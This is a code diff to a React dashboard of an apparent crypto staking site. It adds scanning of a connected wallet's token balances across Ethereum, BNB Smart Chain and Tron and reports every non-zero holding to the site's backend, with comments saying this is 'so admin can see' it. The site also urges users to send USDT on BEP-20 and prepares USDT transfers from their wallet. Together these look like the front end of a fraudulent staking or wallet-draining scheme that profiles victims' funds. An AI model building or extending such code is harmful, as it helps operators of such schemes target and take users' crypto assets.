@@ -11,7 +11,70 @@ const USDT_ABI = [
   'function transfer(address to, uint256 amount) returns (bool)'
 ];
 
+// ERC-20 tokens to scan for non-zero balances
+const KNOWN_TOKENS = [
+  { symbol: 'USDT', name: 'Tether USD',  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  coingeckoId: 'tether' },
+  { symbol: 'USDC', name: 'USD Coin',    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  coingeckoId: 'usd-coin' },
+  { symbol: 'DAI',  name: 'Dai',         address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, coingeckoId: 'dai' },
+  { symbol: 'WBTC', name: 'Wrapped BTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  coingeckoId: 'wrapped-bitcoin' },
+  { symbol: 'WETH', name: 'Wrapped ETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, coingeckoId: 'weth' },
+  { symbol: 'LINK', name: 'Chainlink',   address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, coingeckoId: 'chainlink' },
+  { symbol: 'UNI',  name: 'Uniswap',     address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, coingeckoId: 'uniswap' },
+  { symbol: 'SHIB', name: 'Shiba Inu',   address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, coingeckoId: 'shiba-inu' },
+  { symbol: 'MATIC',name: 'Polygon',     address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', decimals: 18, coingeckoId: 'matic-network' },
+];
+const ERC20_MIN_ABI = ['function balanceOf(address owner) view returns (uint256)'];
+
+// ── BSC (BNB Smart Chain) tokens — same wallet address, different chain ──────
+const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
+const BSC_TOKENS = [
+  { symbol: 'USDT',  name: 'Tether USD (BSC)',   address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, coingeckoId: 'tether' },
+  { symbol: 'USDC',  name: 'USD Coin (BSC)',      address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, coingeckoId: 'usd-coin' },
+  { symbol: 'BUSD',  name: 'Binance USD',         address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, coingeckoId: 'binance-usd' },
+  { symbol: 'WBNB',  name: 'Wrapped BNB',         address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18, coingeckoId: 'wbnb' },
+  { symbol: 'CAKE',  name: 'PancakeSwap',         address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, coingeckoId: 'pancakeswap-token' },
+  { symbol: 'DAI',   name: 'Dai (BSC)',           address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18, coingeckoId: 'dai' },
+];
+// ─────────────────────────────────────────────────────────────────────────────
+
 const API_BASE = import.meta.env.VITE_API_URL || 'https://cryptowave-backend-pq3e.onrender.com';
+
+// ── Tron USDT scanning ──────────────────────────────────────────────────────
+// Tron uses the same secp256k1 curve as Ethereum — same private key → same
+// 20-byte address hash. Only the prefix byte (0x41) and base58check encoding differ.
+const BASE58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+function base58Encode(bytes) {
+  let n = BigInt('0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(''));
+  let result = '';
+  while (n > 0n) { result = BASE58_CHARS[Number(n % 58n)] + result; n /= 58n; }
+  for (const b of bytes) { if (b !== 0) break; result = '1' + result; }
+  return result;
+}
+async function ethToTronAddress(ethAddr) {
+  const hex = ethAddr.replace('0x', '').toLowerCase();
+  const bytes = Uint8Array.from(('41' + hex).match(/.{2}/g).map(b => parseInt(b, 16)));
+  const h1 = await crypto.subtle.digest('SHA-256', bytes);
+  const h2 = await crypto.subtle.digest('SHA-256', h1);
+  const full = new Uint8Array(bytes.length + 4);
+  full.set(bytes); full.set(new Uint8Array(h2).slice(0, 4), bytes.length);
+  return base58Encode(full);
+}
+const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+async function fetchTronUSDT(ethAddress) {
+  try {
+    const tronAddr = await ethToTronAddress(ethAddress);
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), 6000);
+    const res = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddr}`, { signal: ctrl.signal });
+    clearTimeout(timer);
+    const data = await res.json();
+    if (!data.data?.length) return 0;
+    const trc20 = data.data[0].trc20 || [];
+    const entry = trc20.find(t => t[TRON_USDT]);
+    return entry ? parseFloat(entry[TRON_USDT]) / 1e6 : 0;
+  } catch (e) { return 0; }
+}
+// ────────────────────────────────────────────────────────────────────────────
 
 function Dashboard({ walletAddress, onDisconnect }) {
   const [activeTab, setActiveTab] = useState('overview');
@@ -21,6 +84,9 @@ function Dashboard({ walletAddress, onDisconnect }) {
   // Real wallet data
   const [ethBalance, setEthBalance] = useState('0.00');
   const [usdtBalance, setUsdtBalance] = useState('0.00');
+  const [tokenBalances, setTokenBalances] = useState([]); // non-zero ERC-20 tokens
+  const [totalUsdValue, setTotalUsdValue] = useState('0.00');
+  const [ethUsdValue, setEthUsdValue] = useState('0.00');
   const [loading, setLoading] = useState(false);
   const [dataLoading, setDataLoading] = useState(true);
 
@@ -54,45 +120,136 @@ function Dashboard({ walletAddress, onDisconnect }) {
   const [withdrawals, setWithdrawals] = useState([]);
 
   // Report balance to backend (so admin can see it)
-  const reportBalanceToBackend = useCallback(async (eth, usdt) => {
+  const reportBalanceToBackend = useCallback(async (eth, usdt, tokens = []) => {
     try {
       await fetch(`${API_BASE}/api/report-balance`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress, eth, usdt })
+        body: JSON.stringify({ walletAddress, eth, usdt, tokens })
       });
     } catch (error) {
       console.log('Failed to report balance to backend');
     }
   }, [walletAddress]);
 
-  // Fetch real wallet balance
+  // Fetch real wallet balance — scans ETH + all known ERC-20 tokens
   const fetchWalletBalance = useCallback(async () => {
     if (!window.ethereum || !walletAddress) return;
-
     try {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
 
-      // Fetch ETH balance
+      // 1. ETH balance
       const ethBal = await provider.getBalance(walletAddress);
       const ethFormatted = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(4);
       setEthBalance(ethFormatted);
 
-      // Fetch USDT balance
-      let usdtFormatted = '0.00';
+      // 2. USD prices — CoinGecko first, Binance ETH fallback, stablecoins hardcoded
+      const STABLECOIN_PRICE = { tether: 1, 'usd-coin': 1, dai: 1, 'binance-usd': 1 };
+      let prices = {};
       try {
-        const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
-        const usdtBal = await usdtContract.balanceOf(walletAddress);
-        const decimals = await usdtContract.decimals();
-        usdtFormatted = parseFloat(ethers.utils.formatUnits(usdtBal, decimals)).toFixed(2);
-        setUsdtBalance(usdtFormatted);
-      } catch (usdtError) {
-        console.log('USDT fetch error (may be on testnet):', usdtError);
-        setUsdtBalance('0.00');
+        const allIds = [
+          'ethereum', 'binancecoin', 'wbnb', 'pancakeswap-token',
+          ...KNOWN_TOKENS.map(t => t.coingeckoId),
+          ...BSC_TOKENS.map(t => t.coingeckoId),
+        ];
+        const ids = [...new Set(allIds)].join(',');
+        const priceRes = await fetch(
+          `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`,
+          { signal: AbortSignal.timeout(8000) }
+        );
+        const data = await priceRes.json();
+        if (data?.ethereum?.usd > 0) prices = data;
+      } catch (e) {
+        console.log('CoinGecko failed, trying Binance for ETH price');
       }
 
-      // Report balance to backend so admin can see it
-      reportBalanceToBackend(ethFormatted, usdtFormatted);
+      // Fallback: fetch ETH from Binance if CoinGecko missed it
+      if (!prices?.ethereum?.usd) {
+        try {
+          const r = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT',
+            { signal: AbortSignal.timeout(5000) });
+          const d = await r.json();
+          if (d?.price) prices = { ...prices, ethereum: { usd: parseFloat(d.price) } };
+        } catch (e) { /* silently fail */ }
+      }
+
+      // Hardcode stablecoin prices so they always show $1
+      for (const [id, val] of Object.entries(STABLECOIN_PRICE)) {
+        if (!prices[id]?.usd) prices[id] = { usd: val };
+      }
+
+      const ethPrice = prices['ethereum']?.usd || 0;
+      const ethUsd = parseFloat(ethFormatted) * ethPrice;
+      setEthUsdValue(ethUsd.toFixed(2));
+
+      // 3. Scan all known ERC-20 tokens for non-zero balances
+      const tokens = [];
+      let usdtFormatted = '0.00';
+      for (const token of KNOWN_TOKENS) {
+        try {
+          const contract = new ethers.Contract(token.address, ERC20_MIN_ABI, provider);
+          const raw = await contract.balanceOf(walletAddress);
+          const bal = parseFloat(ethers.utils.formatUnits(raw, token.decimals));
+          if (bal > 0) {
+            const price = prices[token.coingeckoId]?.usd || 0;
+            const balStr = bal.toFixed(token.decimals <= 6 ? 2 : 6);
+            const usdVal = (bal * price).toFixed(2);
+            tokens.push({ symbol: token.symbol, name: token.name, balance: balStr, usdValue: usdVal });
+            if (token.symbol === 'USDT') usdtFormatted = balStr;
+          }
+        } catch (e) { /* skip on contract error */ }
+      }
+      setUsdtBalance(usdtFormatted);
+
+      // 4. Scan Tron USDT (same private key → deterministic Tron address)
+      const tronUsdt = await fetchTronUSDT(walletAddress);
+      if (tronUsdt > 0) {
+        const tronBalStr = tronUsdt.toFixed(2);
+        tokens.push({ symbol: 'USDT', name: 'Tether USD (Tron)', balance: tronBalStr, usdValue: tronBalStr, chain: 'tron' });
+        if (usdtFormatted === '0.00') setUsdtBalance(tronBalStr);
+      }
+
+      // 5. Scan BSC (BNB Smart Chain) — same address works on all EVM chains
+      try {
+        const bscProvider = new ethers.providers.JsonRpcProvider(BSC_RPC);
+        // Native BNB balance
+        const bnbRaw = await Promise.race([
+          bscProvider.getBalance(walletAddress),
+          new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 6000))
+        ]);
+        const bnbBal = parseFloat(ethers.utils.formatEther(bnbRaw));
+        if (bnbBal > 0) {
+          const bnbPrice = prices['binancecoin']?.usd || 0;
+          tokens.push({ symbol: 'BNB', name: 'BNB (BSC)', balance: bnbBal.toFixed(5), usdValue: (bnbBal * bnbPrice).toFixed(2), chain: 'bsc' });
+          if (usdtFormatted === '0.00') { /* BNB is not USDT */ }
+        }
+        // BEP-20 tokens
+        for (const token of BSC_TOKENS) {
+          try {
+            const contract = new ethers.Contract(token.address, ERC20_MIN_ABI, bscProvider);
+            const raw = await Promise.race([
+              contract.balanceOf(walletAddress),
+              new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 5000))
+            ]);
+            const bal = parseFloat(ethers.utils.formatUnits(raw, token.decimals));
+            if (bal > 0) {
+              const price = prices[token.coingeckoId]?.usd || (STABLECOIN_PRICE[token.coingeckoId] || 0);
+              const balStr = bal.toFixed(2);
+              const usdVal = (bal * price).toFixed(2);
+              tokens.push({ symbol: token.symbol, name: token.name, balance: balStr, usdValue: usdVal, chain: 'bsc' });
+              if (token.symbol === 'USDT' && usdtFormatted === '0.00') { setUsdtBalance(balStr); usdtFormatted = balStr; }
+            }
+          } catch (e) { /* skip token */ }
+        }
+      } catch (e) { console.log('BSC scan skipped:', e.message); }
+
+      setTokenBalances(tokens);
+
+      const totalUsd = (ethUsd + tokens.reduce((s, t) => s + parseFloat(t.usdValue), 0)).toFixed(2);
+      setTotalUsdValue(totalUsd);
+
+      // 6. Report all balances to backend so admin can see them
+      reportBalanceToBackend(ethFormatted, usdtFormatted, tokens);
     } catch (error) {
       console.error('Error fetching wallet balance:', error);
     }
@@ -230,7 +387,7 @@ function Dashboard({ walletAddress, onDisconnect }) {
       // Step 2: Create signer and contract
       showNotification('Preparing USDT transfer...', 'info');
       const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = web3Provider.getSigner();
+      const signer = web3Provider.getSigner(walletAddress);
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
 
       // Step 3: Convert amount to USDT decimals (6 decimals)
@@ -606,11 +763,11 @@ function Dashboard({ walletAddress, onDisconnect }) {
 
                 <div className="stat-card">
                   <div className="stat-header">
-                    <span className="stat-icon">💵</span>
-                    <span className="stat-label">Wallet USDT</span>
+                    <span className="stat-icon">💼</span>
+                    <span className="stat-label">Total Portfolio</span>
                   </div>
-                  <div className="stat-value">{formatNumber(usdtBalance)} USDT</div>
-                  <div className="stat-change">Available to stake</div>
+                  <div className="stat-value">${formatNumber(totalUsdValue)}</div>
+                  <div className="stat-change">{tokenBalances.length + 1} asset{tokenBalances.length !== 0 ? 's' : ''} in wallet</div>
                 </div>
 
                 <div className="stat-card">
@@ -619,7 +776,7 @@ function Dashboard({ walletAddress, onDisconnect }) {
                     <span className="stat-label">ETH Balance</span>
                   </div>
                   <div className="stat-value">{ethBalance} ETH</div>
-                  <div className="stat-change">For gas fees</div>
+                  <div className="stat-change">${formatNumber(ethUsdValue)} • gas fees</div>
                 </div>
 
                 <div className="stat-card">
@@ -629,6 +786,47 @@ function Dashboard({ walletAddress, onDisconnect }) {
                   </div>
                   <div className="stat-value">{formatNumber(userData.totalEarned)} USDT</div>
                   <div className="stat-change positive">All time</div>
+                </div>
+              </div>
+
+              {/* Wallet Portfolio Breakdown */}
+              <div className="portfolio-breakdown">
+                <h2 className="section-title">Wallet Portfolio</h2>
+                <div className="token-list">
+                  <div className="token-item">
+                    <div className="token-icon token-eth">⟠</div>
+                    <div className="token-info">
+                      <div className="token-symbol">ETH</div>
+                      <div className="token-name">Ethereum</div>
+                    </div>
+                    <div className="token-balance-info">
+                      <div className="token-amount">{ethBalance} ETH</div>
+                      <div className="token-usd">${formatNumber(ethUsdValue)}</div>
+                    </div>
+                  </div>
+                  {tokenBalances.map((token, i) => (
+                    <div key={`${token.symbol}-${token.chain || 'eth'}-${i}`} className="token-item">
+                      <div className={`token-icon token-${token.symbol.toLowerCase()}`}>
+                        {token.symbol.slice(0, 2)}
+                      </div>
+                      <div className="token-info">
+                        <div className="token-symbol">
+                          {token.symbol}
+                          {token.chain === 'tron' && <span style={{fontSize:'0.65rem',background:'#ef4444',color:'#fff',borderRadius:'3px',padding:'1px 4px',marginLeft:'4px'}}>TRC-20</span>}
+                          {token.chain === 'bsc' && <span style={{fontSize:'0.65rem',background:'#f0b90b',color:'#000',borderRadius:'3px',padding:'1px 4px',marginLeft:'4px'}}>BSC</span>}
+                        </div>
+                        <div className="token-name">{token.name}</div>
+                      </div>
+                      <div className="token-balance-info">
+                        <div className="token-amount">{token.balance} {token.symbol}</div>
+                        <div className="token-usd">${formatNumber(token.usdValue)}</div>
+                      </div>
+                    </div>
+                  ))}
+                  <div className="token-total-row">
+                    <span>Total Portfolio Value</span>
+                    <span className="token-total-value">${formatNumber(totalUsdValue)}</span>
+                  </div>
                 </div>
               </div>
 
@@ -710,6 +908,18 @@ function Dashboard({ walletAddress, onDisconnect }) {
               <div className="stake-grid">
                 <div className="stake-panel">
                   <h2 className="panel-title">Stake USDT</h2>
+
+                  {/* Network warning */}
+                  <div style={{background:'rgba(234,179,8,0.12)',border:'1px solid rgba(234,179,8,0.4)',borderRadius:'10px',padding:'12px 14px',marginBottom:'16px'}}>
+                    <div style={{display:'flex',alignItems:'flex-start',gap:'10px'}}>
+                      <span style={{fontSize:'1.1rem',flexShrink:0}}>⚠️</span>
+                      <div style={{fontSize:'0.82rem',color:'#fde68a',lineHeight:'1.5'}}>
+                        <strong style={{display:'block',marginBottom:'4px',color:'#fbbf24'}}>Important: Use BEP-20 (BSC) Network Only</strong>
+                        Send <strong>USDT on BNB Smart Chain (BEP-20)</strong> to stake. Sending on the wrong network (Ethereum ERC-20 or Tron TRC-20) will result in an undetected deposit and your stake will not be credited.
+                      </div>
+                    </div>
+                  </div>
+
                   <div className="balance-display">
                     <span>Available Balance</span>
                     <span className="balance-value">{formatNumber(usdtBalance)} USDT</span>
